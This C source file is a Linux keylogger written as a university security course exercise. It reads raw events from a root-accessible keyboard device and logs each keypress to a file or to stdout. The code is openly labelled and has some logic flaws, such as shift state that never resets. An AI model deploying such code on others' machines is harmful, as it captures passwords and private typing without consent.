/* * * * * * * * * * * * * * * * *\
 *                               *
 *        Linux keylogger        *
 *                               *
 * File:    	keylogger.c      *
 * Author:  	Tasos Anastasas  *
 * A.M:     	3166             *
 * Course:  	CS457            *
 * Exercises: 	2017             *
 * Number:   	3                *
\* * * * * * * * * * * * * * * * */

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <linux/input.h>

#include "keylogger.h"

int signalCatched = 0;
/*
 * normal keyboard keystrokes 
 */
const char * keycodes[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
    "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
    "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK, UK, UK, UK,
    "PAUSE"
};

/*
 * keyboard keystrokes when the right or left Shift key is pressed
 */
const char *shifted_keycodes[] = {
    "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
    "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
    "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H",
    "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B",
    "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5",
    "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK, UK, UK, UK, UK, UK, "R_ENTER", "R_CTRL", "/",
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END",
    "DOWN", "PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK, UK, UK, UK,
    "PAUSE"
};

/*
 * returns true when the keycode is a Shift (left or right)
 */
bool isShift(int code) {
    return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}

/*
 * returns true when the keycode is Esc
 */
bool isEsc(int code) {
    return (code == KEY_ESC);
}

/*
 * checks if the user has root privileges
 */
bool isRoot(void) {
    if (geteuid() != 0) {
        printf("\nMust run it as root, in order to have access "
                "to the keyboard device\n");
        return false;
    }
    return true;
}

/*
 * prints the usage message
 */
void usage(void) {
    printf(
            "\n"
            "Usage:\n"
            "     sudo ./keyloger [ -s | -f file] [-h]\n"
            "\n"
            "Options:\n"
            "  -f    file    Path to the output file.\n"
            "  -s            Print to stdout.\n"
            "  -h            This help message.\n"
            );
    exit(EXIT_FAILURE);
}

void sigfun(int sig) {
    signalCatched = 1;
    return;
}

/*
 * The keylogger's core functionality
 * Takes as argument the keyboard file descriptor
 * You can add more arguments if needed
 */
void keylogger(int keyboard, int outputFD) {
    //register signal function
    (void) signal(SIGINT, sigfun);

    struct input_event ev;
    ssize_t size;
    unsigned int shiftPressing = 0;

    while (1) {
        // read(...); /* read the data from the keyboard */
        size = read(keyboard, &ev, sizeof (ev));

        //check if ctr-c catched
        if (signalCatched) break;

        //error checking for read
        if (size == (-1)) {
            //continue on any interupt
            if (errno == EINTR) continue;
            break;
        } else if (size != sizeof (ev)) {
            errno = EIO;
            break;
        }

        /* Implement your keylogger, catch the input_events */
        if (ev.type == EV_KEY && ev.value == 1) {
            if (isShift(ev.code)) {
                if (ev.value == 1) {
                    write(outputFD, keycodes[ev.code], strlen(keycodes[ev.code]));
                    write(outputFD, "\n", strlen("\n"));
                    shiftPressing = 1;
                }else shiftPressing = 0;
                continue;
            }
            if (shiftPressing) {
                write(outputFD, shifted_keycodes[ev.code], strlen(shifted_keycodes[ev.code]));
            } else {
                write(outputFD, keycodes[ev.code], strlen(keycodes[ev.code]));
            }
            write(outputFD, "\n", strlen("\n"));
            if (isEsc(ev.code)) {
                break;
            }
        }
    }
    return;
}